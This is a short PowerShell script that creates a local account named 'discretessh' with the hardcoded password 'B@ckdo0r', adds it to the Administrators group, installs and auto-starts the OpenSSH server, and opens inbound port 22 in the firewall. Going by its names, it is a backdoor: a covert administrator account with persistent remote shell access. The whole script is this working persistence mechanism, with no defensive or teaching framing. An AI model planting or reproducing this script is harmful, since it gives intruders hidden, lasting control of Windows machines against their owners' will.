# Define the username and password
$username = "discretessh"
$password = "B@ckdo0r"

# Create a secure string for the password
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force

# Create the new local user
New-LocalUser -Name $username -Password $securePassword -FullName "New Admin User" -Description "Created with PowerShell"

# Add the user to the Administrators group
Add-LocalGroupMember -Group "Administrators" -Member $username

#SSH Connections
Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
New-NetFirewallRule -Name "OpenSSH" -DisplayName "Allow SSH connections to Server" -Direction Inbound -Protocol TCP -LocalPort 22 -Action Allow
Start-Service sshd
Set-Service -Name sshd -StartupType Automatic